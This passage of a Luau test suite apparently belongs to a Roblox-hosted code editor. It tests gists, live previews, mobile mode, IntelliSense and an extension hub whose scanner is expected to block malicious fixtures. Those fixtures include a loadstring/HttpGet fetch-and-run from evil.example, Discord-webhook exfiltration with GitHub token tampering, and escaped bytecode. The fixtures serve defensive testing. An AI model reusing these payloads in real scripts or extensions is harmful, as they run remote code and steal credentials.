			assertTrue(type(payload.files) == "table", "Gist POST body includes files map")
			return {
				StatusCode = 201,
				Body = {
					id = "f00dbabe12345678",
					html_url = "https://gist.github.com/f00dbabe12345678",
				},
			}
		end
	end)
	local importedGist, igErr = api.importGist("a1b2c3d4e5f60001")
	assertTrue(importedGist ~= nil and importedGist.count == 1, "Imported GitHub Gist to local disk: " .. tostring(igErr))
	assertEq(api.readFile("gists/utility_snippet.luau"), "return 'from_gist'\n", "Gist content persisted to disk")

	api.openFile("gists/utility_snippet.luau")
	local pubGist, pgErr = api.publishGist({ public = false })
	assertTrue(pubGist ~= nil and pubGist.url == "https://gist.github.com/f00dbabe12345678", "Published Gist via POST /gists: " .. tostring(pgErr))
	assertEq(H.sandbox.__clipboard, "https://gist.github.com/f00dbabe12345678", "Published Gist URL copied to clipboard")

	-- (F) Upgraded Settings UI + Live Raw `settings.json` Sync
	local okSettings, settingsDoc = api.runCommand("preferences.openSettingsJson")
	assertTrue(okSettings and settingsDoc ~= nil and settingsDoc.path == ".vsrblx/settings.json", "Opened raw .vsrblx/settings.json")
	local parsedCfg = json.decode(settingsDoc.content)
	parsedCfg.editor.tabSize = 2
	api.codeStore.updateContent(settingsDoc.id, json.encode(parsedCfg))
	api.runCommand("file.save")
	assertEq(api.config.get("editor.tabSize"), 2, "Saving .vsrblx/settings.json live-synced config.editor.tabSize = 2!")
end)

check("9. Combined Sprint 4 + Sprint 5: Multi-Language Live Split Preview Engine & Mobile Acode Mode", function()
	-- (A) Language-Gated Preview Eligibility (Included on previewable, strictly omitted on non-previewable)
	for _, yesLang in ipairs({ "html", "css", "markdown", "json", "yaml", "sql", "python", "javascript", "typescript" }) do
		assertTrue(api.languages.isPreviewable(yesLang) == true, yesLang .. " supports live preview")
	end
	for _, noLang in ipairs({ "luau", "rust", "go", "cpp", "csharp", "java", "shell", "plaintext" }) do
		assertTrue(api.languages.isPreviewable(noLang) == false, noLang .. " omits live preview")
	end

	-- Opening a Luau or Rust file hides `OpenPreviewBtn_primary` and refuses `preview.openToSide`
	api.writeFile("src/engine.rs", "fn main() { println!(\"no preview\"); }\n")
	api.openFile("src/engine.rs")
	assertEq(H.byName("OpenPreviewBtn_primary").Visible, false, "Preview button hidden on Rust (.rs) file")
	local okNoPrev, resNoPrev = api.openPreview()
	assertTrue(okNoPrev and resNoPrev == false, "openPreview() cleanly declined on non-previewable language")
	assertEq(H.byName("LivePreviewPane").Visible, false, "LivePreviewPane stays hidden on Rust")

	-- (B) Live HTML + Workspace `style.css` Split Preview (with live CSS edit sync!)
	api.writeFile("web/style.css", "body { background-color: #0f172a; color: #f8fafc; }\n.hero { background: #2563eb; color: #ffffff; padding: 14px; border-radius: 8px; }\nbutton { background: #22c55e; color: #111827; }\n")
	api.writeFile("web/index.html", table.concat({
		"<!DOCTYPE html>",
		"<html><head><title>RBLX Web UI</title><link rel=\"stylesheet\" href=\"style.css\"></head>",
		"<body>",
		"  <h1>Welcome to Live HTML Preview</h1>",
		"  <div class=\"hero\">Styled by live style.css!</div>",
		"  <button>Deploy Build</button>",
		"</body></html>",
	}, "\n"))
	local htmlDoc = api.openFile("web/index.html")
	assertTrue(H.byName("OpenPreviewBtn_primary").Visible == true, "Preview button shown on HTML file")
	H.click(H.byName("OpenPreviewBtn_primary"))
	assertTrue(H.byName("LivePreviewPane").Visible == true, "LivePreviewPane opened to the side")
	local htmlSurf = H.byName("HtmlPreviewSurface")
	assertTrue(htmlSurf ~= nil, "HtmlPreviewSurface rendered")
	assertEq(htmlSurf.BackgroundColor3:ToHex(), "0f172a", "HTML surface applied body background #0f172a from style.css")

	-- Edit `web/style.css` on disk and re-activate HTML -> preview cascades new CSS color immediately!
	api.writeFile("web/style.css", "body { background-color: #1e1b4b; color: #f8fafc; }\n")
	api.codeStore.activate(htmlDoc.id, "primary")
	api.app.previewPane.render(htmlDoc)
	assertEq(H.byName("HtmlPreviewSurface").BackgroundColor3:ToHex(), "1e1b4b", "Live CSS change updated HTML preview background to #1e1b4b")

	-- (C) CSS Design System Preview, Markdown GFM Preview, JSON/YAML Tree, SQL Table & Python/TS Quick-Eval
	api.openFile("web/style.css")
	assertTrue(H.byName("CssSwatchGrid") ~= nil, "CSS preview rendered extracted color swatch palette")

	api.writeFile("docs/guide.md", "# Sprint Guide\n- [x] Ship Preview\n| Lang | Live |\n|---|---|\n| HTML | Yes |\n```luau\nlocal ok = true\n```\n")
	api.openFile("docs/guide.md")
	assertTrue(H.byName("MdHeading_1") ~= nil and H.byName("MdTable_3") ~= nil and H.byName("MdCodeFence_4") ~= nil,
		"Markdown preview rendered GFM heading, table, and syntax-colored code fence")

	api.writeFile("config/app.json", '{"app":"VS-RBLX","features":["preview","mobile"],"port":8080}')
	api.openFile("config/app.json")
	assertTrue(H.byName("TreeNode_root") ~= nil, "JSON preview rendered interactive collapsible tree")

	api.writeFile("db/schema.sql", table.concat({
		"CREATE TABLE players (id INT, username TEXT, score INT);",
		"INSERT INTO players VALUES (1, 'Builderman', 950), (2, 'Guest', 420);",
		"SELECT username, score FROM players WHERE score > 500;",
	}, "\n"))
	api.openFile("db/schema.sql")
	local sqlGrid = H.byName("SqlResultGrid_1")
	assertTrue(sqlGrid ~= nil, "SQL preview executed CREATE/INSERT/SELECT and rendered result table")

	api.writeFile("scripts/calc.py", "base = 21\ndoubled = base * 2\nprint(f'Computed={doubled}')\n")
	api.openFile("scripts/calc.py")
	assertTrue(H.byName("ScriptEvalOutputCard") ~= nil and H.byName("ScriptEvalVarsCard") ~= nil,
		"Python quick-eval preview rendered stdout (`Computed=42`) & variable table")

	-- Switching back to a Luau file automatically hides LivePreviewPane & preview button!
	api.openFile("src/main.luau")
	assertEq(H.byName("OpenPreviewBtn_primary").Visible, false, "Preview button hidden when switching back to Luau")
	assertEq(H.byName("LivePreviewPane").Visible, false, "LivePreviewPane hidden when active tab is Luau")

	-- (D) Mobile "Acode" Mode: Manual Toggle, 42px Touch Tabs, `☰` Slide-Over Drawer, Quick-Keys & Play-While-Coding
	assertEq(api.isMobileMode(), false, "Starts in Desktop mode on desktop viewport")
	api.setMobileMode(true)
	assertTrue(api.isMobileMode() == true, "Switched to Acode Mobile Mode manually")
	assertEq(H.byName("MobileDrawerBtn").Visible, true, "`☰` MobileDrawerBtn visible in TitleBar")
	assertEq(H.byName("TabBar_primary").Size.Y.Offset, 42, "Touch-friendly 42px TabBar active in Mobile Mode")
	assertEq(H.byName("MobileQuickKeysBar").Visible, true, "Acode Quick-Keys symbol bar visible")
	assertEq(H.byName("ActivityBar").Visible, false, "Desktop ActivityBar collapsed into slide-over drawer")

	-- Open `☰` Slide-Over Drawer -> switch to Search -> tap backdrop to dismiss
	H.click(H.byName("MobileDrawerBtn"))
	assertEq(H.byName("PrimarySideBar").Visible, true, "Slide-over drawer opened on `☰` tap")
	assertEq(H.byName("MobileDrawerBackdrop").Visible, true, "Drawer backdrop visible")
	H.click(H.byName("DrawerTab_search"))
	assertEq(api.app.viewlets.search.root.Visible, true, "Switched drawer viewlet to Search via touch pill")
	H.click(H.byName("MobileDrawerBackdrop"))
	assertEq(H.byName("PrimarySideBar").Visible, false, "Tapping backdrop dismissed slide-over drawer")

	-- Tap Acode Quick-Key `{` to insert symbol at cursor
	api.writeFile("src/mobile_edit.luau", "local tbl = ")
	local mobDoc = api.openFile("src/mobile_edit.luau", { reloadFromDisk = true })
	api.app.primaryEditor.box.CursorPosition = #mobDoc.content + 1
	api.app.primaryEditor.box.SelectionStart = -1
	H.click(H.byName("QuickKey_lbrace"))
	assertEq(mobDoc.content, "local tbl = {", "Acode Quick-Key `{` inserted `{` at cursor")

	-- Keyboard-aware viewport shrink & Play-While-Coding split-peek dock
	api.responsive.setVirtualKeyboard(true, 220)
	assertTrue(H.byName("VSCodeWindow").Size.Y.Offset <= 900 - 220, "Window shrunk above virtual on-screen keyboard")
	api.responsive.setVirtualKeyboard(false)

	H.click(H.byName("QuickKey_play"))
	assertTrue(api.app.window.playWhileCoding == true, "Play-While-Coding split-peek activated")
	assertTrue(H.byName("VSCodeWindow").Position.X.Offset > 400, "Window docked to right half leaving left gameplay area open")
	assertTrue(api.getOpacity() <= 0.75, "Play-While-Coding enabled translucent Ghost opacity")
	H.click(H.byName("QuickKey_play"))
	api.setMobileMode(false)
	assertEq(api.isMobileMode(), false, "Switched back to Desktop mode anytime")

	-- (E) Android / Touch Device Auto-Detection + Switch Prompt on First Boot
	local HMobile = mockEnv.new({ width = 844, height = 390, touch = true })
	local mobApi, mErr = HMobile.boot("dist/vsrblx.lua")
	assertTrue(mobApi ~= nil, "Booted on simulated Android touch viewport: " .. tostring(mErr))
	local promptModal = HMobile.byName("ConfirmModal")
	assertTrue(promptModal ~= nil, "Touch device auto-surfaced Acode Mobile Mode switch prompt!")
	HMobile.click(HMobile.byName("ConfirmPrimaryBtn"))
	assertTrue(mobApi.isMobileMode() == true, "Accepting prompt switched player straight into Acode Mobile Mode!")
	mobApi.destroy()
end)

check("10. Finale 6A + Finale 6B: Deep LSP-Style IntelliSense Engine & Locked 5-Template Community Extension Hub", function()
	-- =========================================================================
	-- FINALE 6A: Deep LSP-Style IntelliSense Engine
	-- =========================================================================

	-- (1) `$0` Cursor-Stop Expansion
	local expText, caretOff = api.intellisense.expandInsert('game:GetService("$0")')
	assertEq(expText, 'game:GetService("")', "Cleaned $0 marker from snippet")
	assertEq(caretOff, 17, "Placed caret right between quotes")

	-- (2) `GetService("...")`, `Instance.new("...")` & `Enum.<Category>.<Item>` Completion
	local svcSug = api.intellisense.suggest('local P = game:GetService("Tw', 30, "luau", 8)
	assertTrue(#svcSug >= 1 and svcSug[1].label == "TweenService", "Suggested TweenService inside GetService(\"Tw")

	local clsSug = api.intellisense.suggest('local b = Instance.new("TextB', 30, "luau", 8)
	assertTrue(#clsSug >= 1 and clsSug[1].label == "TextButton", "Suggested TextButton inside Instance.new(\"TextB")

	local enumSug = api.intellisense.suggest("local style = Enum.EasingStyle.Qu", 34, "luau", 8)
	assertTrue(#enumSug >= 1 and enumSug[1].label:find("^Qu") ~= nil, "Suggested Enum.EasingStyle.Quad/Quart/Quint")

	-- (3) Live DataModel Child Introspection (`workspace.` -> live child Instances + Workspace members)
	local spawnPart = H.sandbox.Instance.new("Part", H.sandbox.workspace)
	spawnPart.Name = "ArenaSpawnPad"
	local liveWsSug = api.intellisense.suggest("workspace.Arena", 16, "luau", 8)
	local foundSpawnPad = false
	for _, it in ipairs(liveWsSug) do
		if it.label == "ArenaSpawnPad" and it.kind == "instance" then
			foundSpawnPad = true
		end
	end
	assertTrue(foundSpawnPad, "Introspected live DataModel child `workspace.ArenaSpawnPad`!")

	-- (4) Local Variable Type Inference (`Players.` vs `Players:`)
	local typedSrc = 'local Players = game:GetService("Players")\nPlayers.'
	local propSug = api.intellisense.suggest(typedSrc, #typedSrc + 1, "luau", 10)
	local foundLP = false
	for _, it in ipairs(propSug) do
		if it.label == "LocalPlayer" then foundLP = true end
	end
	assertTrue(foundLP, "Inferred `Players` service type and suggested `.LocalPlayer` property")

	local methSrc = 'local Players = game:GetService("Players")\nPlayers:GetP'
	local methSug = api.intellisense.suggest(methSrc, #methSrc + 1, "luau", 10)
	assertTrue(#methSug >= 1 and methSug[1].label == "GetPlayers", "Inferred `Players:GetPlayers()` method on `:`")

	-- (5) Cross-File Workspace `require("...")` Indexing, Signature Help, Hover Docs & `F12` Go-to-Definition
	api.writeFile("src/combat_math.luau", table.concat({
		"local M = {}",
		"-- Computes critical melee hit damage with armor mitigation",
		"function M.calcDamage(baseDmg: number, critMult: number, armor: number)",
		"\treturn math.max(1, baseDmg * critMult - armor)",
		"end",
		"M.DEFAULT_CRIT = 1.5",
		"return M",
	}, "\n"))

	-- `require("...")` path autocomplete
	local reqSug = api.intellisense.suggest('local cm = require("src/combat', 31, "luau", 8, "src/caller.luau")
	assertTrue(#reqSug >= 1 and reqSug[1].label == "src/combat_math", "Suggested workspace module path inside require(\"...")

	-- Cross-file exported member completion (`cm.`)
	local callerDraft = 'local cm = require("src/combat_math")\ncm.'
	local expSug = api.intellisense.suggest(callerDraft, #callerDraft + 1, "luau", 8, "src/caller.luau")
	local foundCalc = false
	for _, it in ipairs(expSug) do
		if it.label == "calcDamage" then foundCalc = true end
	end
	assertTrue(foundCalc, "Suggested cross-file exported function `cm.calcDamage` from `src/combat_math.luau`!")

	-- Parameter Signature Help (`cm.calcDamage(50, ` -> activeParam = 2!)
	local callInProgress = 'local cm = require("src/combat_math")\nlocal d = cm.calcDamage(50, '
	local sigInfo = api.intellisense.signatureHelp(callInProgress, #callInProgress + 1, "luau", "src/caller.luau")
	assertTrue(sigInfo ~= nil and sigInfo.activeParam == 2, "Signature help resolved `cm.calcDamage` activeParam == 2")
	assertTrue(sigInfo.params[2]:find("critMult") ~= nil, "Signature help identified 2nd parameter `critMult: number`")

	-- Live Editor UI: SignatureHelpCard, HoverDocCard & `F12` Cross-File Go-to-Definition!
	api.writeFile("src/caller.luau", 'local cm = require("src/combat_math")\nlocal hit = cm.calcDamage(100, 2, 15)\n')
	local callerDoc = api.openFile("src/caller.luau", { reloadFromDisk = true })
	local edBox = api.app.primaryEditor.box
	edBox:CaptureFocus()
	local calcIdx = callerDoc.content:find("calcDamage", 1, true)
	edBox.CursorPosition = calcIdx + 3
	api.codeStore.setCursor(callerDoc.id, calcIdx + 3, -1)

	local okHov, hovInfo = api.runCommand("editor.showHover")
	assertTrue(okHov and hovInfo ~= nil and hovInfo.doc:find("critical melee") ~= nil,
		"Hover card extracted doc comment from cross-file `src/combat_math.luau`!")
	assertEq(H.byName("HoverDocCard").Visible, true, "HoverDocCard visible in editor")

	local okDef, defInfo = api.runCommand("editor.gotoDefinition")
	assertTrue(okDef and defInfo ~= nil and defInfo.file == "src/combat_math.luau" and defInfo.line == 3,
		"F12 Go-to-Definition resolved `src/combat_math.luau:3`!")
	assertEq(api.codeStore.active("primary").path, "src/combat_math.luau",
		"F12 opened `src/combat_math.luau` in primary editor!")

	-- =========================================================================
	-- FINALE 6B: Locked 5-Template Community Extension Hub & Malware Scanner
	-- =========================================================================

	-- (1) Verify all 5 Official Starter Packs pass the Malware & Schema Scanner
	assertEq(#api.extensionHub.STARTER_CATALOG, 5, "All 5 allowed template starter packs present")
	for _, starter in ipairs(api.extensionHub.STARTER_CATALOG) do
		local sc = api.scanExtension(starter)
		assertTrue(sc.ok == true and sc.risk == "CLEAN", "Starter pack `" .. starter.id .. "` verified CLEAN")
	end

	-- (2) Verify Malware & Schema Scanner strictly BLOCKS every attack vector & non-template issue!
	local badTemplate = api.scanExtension({
		id = "arbitrary-script",
		name = "Arbitrary Runner",
		version = "1.0.0",
		template = "raw-luau-script",
	})
	assertEq(badTemplate.ok, false, "Blocked non-allowlisted 6th template (`raw-luau-script`)")

	local badLoadstring = api.scanExtension({
		id = "sneaky-snippets",
		name = "Sneaky Snippets",
		version = "1.0.0",
		template = "snippet-pack",
		snippets = {
			{ trigger = "help", insert = 'loadstring(game:HttpGet("https://evil.example/payload.lua"))()' },
		},
	})
	assertEq(badLoadstring.ok, false, "Blocked `loadstring` + `HttpGet` hidden inside snippet-pack")

	local badWebhook = api.scanExtension({
		id = "stealer-macro",
		name = "Stealer Macro",
		version = "1.0.0",
		template = "command-macro",
		macros = {
			{
				id = "steal",
				title = "Exfil",
				steps = {
					{ op = "insertText", text = "https://discord.com/api/webhooks/12345/token" },
					{ op = "setSetting", key = "github.pat", value = "stolen" },
				},
			},
		},
	})
	assertEq(badWebhook.ok, false, "Blocked Discord webhook + `github.pat` tampering in command-macro")

	local badEscapedBytecode = api.scanExtension({
		id = "bytecode-pack",
		name = "Bytecode Obfuscated",
		version = "1.0.0",
		template = "snippet-pack",
		snippets = {
			{ trigger = "obf", insert = "\\108\\111\\097\\100\\115\\116\\114\\105\\110\\103" },
		},
	})
	assertEq(badEscapedBytecode.ok, false, "Blocked decimal-escaped bytecode sequence")

	local badOffTopicIssue = api.scanExtension({
		number = 42,
		title = "pls add free blox fruits script",
		body = "hello how do i get infinite money",
	})
	assertEq(badOffTopicIssue.ok, false, "Blocked off-topic non-template GitHub Issue")

	-- (3) Install Verified Theme Pack, Snippet Pack, Command Macro & Toolbar Tool -> Test Live Effects!
	local okTheme = api.installExtension(api.extensionHub.STARTER_CATALOG[1]) -- cyberpunk-neon-theme
	assertTrue(okTheme == true, "Installed verified `theme-pack` extension")
	api.setTheme("ext_cyberpunk_neon_theme")
	assertEq(api.theme.color.accent:ToHex(), "00f0ff", "Applied custom Cyberpunk Neon theme accent `#00f0ff`")

	local okSnip = api.installExtension(api.extensionHub.STARTER_CATALOG[2]) -- roblox-net-combat-snippets
	assertTrue(okSnip == true, "Installed verified `snippet-pack` extension")
	local extSnipSug = api.intellisense.suggest("remf", 5, "luau", 8)
	assertTrue(#extSnipSug >= 1 and extSnipSug[1].label == "remfire", "Installed snippet-pack registered `remfire` trigger in LSP!")

	local okMacro = api.installExtension(api.extensionHub.STARTER_CATALOG[3]) -- luau-header-service-macros
	assertTrue(okMacro == true, "Installed verified `command-macro` extension")

	local okTool = api.installExtension(api.extensionHub.STARTER_CATALOG[5]) -- luau-buffer-power-tools
	assertTrue(okTool == true, "Installed verified `toolbar-tool` extension")
	api.writeFile("src/unsorted.txt", "zebra\nalpha\nmango")
	local sortDoc = api.openFile("src/unsorted.txt", { reloadFromDisk = true })
	api.runCommand("ext.luau-buffer-power-tools.sortLines")
	assertEq(sortDoc.content, "alpha\nmango\nzebra", "Installed `toolbar-tool` sorted buffer lines declaratively!")

	-- (4) Live GitHub Issues Hub Sync: 1 Valid Community Issue (#101) + 1 Malicious Issue (#102)
	local validIssueMd = api.extensionHub.generateIssueMarkdown({
		id = "emerald-matrix-theme",
		name = "Emerald Matrix Dark",
		version = "1.2.0",
		author = "luau-artist",
		summary = "Phosphor green terminal theme.",
		template = "theme-pack",
		theme = {
			isLight = false,
			colors = { editor = "#050d07", accent = "#00ff66" },
			syntax = { keyword = "#00ff66" },
		},
	})
	local maliciousIssueMd = validIssueMd:gsub("Phosphor green terminal theme%.", "https://discord.com/api/webhooks/999/steal")

	H.onHttp(function(_req, url)
		if url == RAW_URL then
			return { StatusCode = 200, Body = bundleSource }
		elseif url:find("/repos/TheStrongestOfTomorrow/VS%-RBLX/issues") then
			return {
				StatusCode = 200,
				Body = json.encode({
					{
						number = 101,
						title = "[EXT] Emerald Matrix Dark",
						user = { login = "luau-artist" },
						comments = 4,
						body = validIssueMd,
					},
					{
						number = 102,
						title = "[EXT] Totally Safe Pack",
						user = { login = "bad-actor" },
						comments = 0,
						body = maliciousIssueMd,
					},
				}),
			}
		end
	end)

	api.runCommand("workbench.viewExtensions")
	local synced = api.syncExtensions("TheStrongestOfTomorrow/VS-RBLX")
	assertEq(#synced, 2, "Fetched 2 open GitHub Issue submissions")
	assertEq(synced[1].scan.ok, true, "Issue #101 (`emerald-matrix-theme`) verified CLEAN by client scanner")
	assertEq(synced[2].scan.ok, false, "Issue #102 (webhook exfil) BLOCKED by client scanner")
	assertEq(H.byName("ExtScanBadge_emerald-matrix-theme").Text, "🛡 CLEAN", "UI rendered `🛡 CLEAN` badge on #101")

	-- Attempting to install blocked Issue #102 fails closed!
	local okEvilInstall = api.installExtension(synced[2].manifest or maliciousIssueMd)
	assertEq(okEvilInstall, false, "Client refused to install blocked Issue #102")

	-- Clean uninstall restores default theme & removes extension commands
	assertTrue(api.uninstallExtension("cyberpunk-neon-theme") == true, "Uninstalled cyberpunk-neon-theme cleanly")
	assertEq(api.theme.activeId, "dark_plus", "Reverted active theme to `dark_plus` on uninstall")
end)

check("11. Re-execution Toggle, Locked-CoreGui PlayerGui Fallback & Dev Fallback", function()
	-- Re-running the same build toggles visibility and returns existing handle
	local secondChunk = assert(H.sandbox.loadstring(
		'return loadstring(game:HttpGet("' .. RAW_URL .. '"))()',
		"@executor2"
	))
	local secondRes = secondChunk()
	assertTrue(secondRes == api, "Re-running identical build reused active VSRBLX instance")
	assertTrue(api.app.window.minimised == true, "Second run toggled window to minimised pill")
	secondChunk()
	assertTrue(api.app.window.minimised == false, "Third run restored window from minimised pill")
	api.destroy()

	-- Locked CoreGui + No Executor Globals -> must fall back cleanly to PlayerGui!
	local HStudio = mockEnv.new({ width = 1280, height = 720, executor = false, lockCoreGui = true })
	local studioApi, sErr = HStudio.boot("dist/vsrblx.localscript.lua")
	assertTrue(studioApi ~= nil, "LocalScript bundle survived locked CoreGui and mounted in PlayerGui: " .. tostring(sErr))
	assertTrue(HStudio.playerGui:FindFirstChild("VSRBLX_Workbench") ~= nil, "Mounted inside PlayerGui")
	assertTrue(studioApi.fs.isBackedByDisk() == false, "Fell back gracefully to virtual memory FS")
	assertTrue(studioApi.writeFile("test.luau", "return 123"), "Virtual memory FS write succeeded")
	assertEq(studioApi.readFile("test.luau"), "return 123", "Virtual memory FS read succeeded")
	studioApi.destroy()

	-- Unbundled dev mode (`init.lua`) when allowHostLoadfile = true
	local HDev = mockEnv.new({ width = 1280, height = 720, allowHostLoadfile = true })
	local devApi, dErr = HDev.boot("init.lua")
	assertTrue(devApi ~= nil, "Unbundled init.lua dev loader works: " .. tostring(dErr))
	devApi.destroy()
end)

io.write(string.format("\nTest Summary: %d passed, %d failed\n", passed, failed))
if failed > 0 then
	os.exit(1)
end
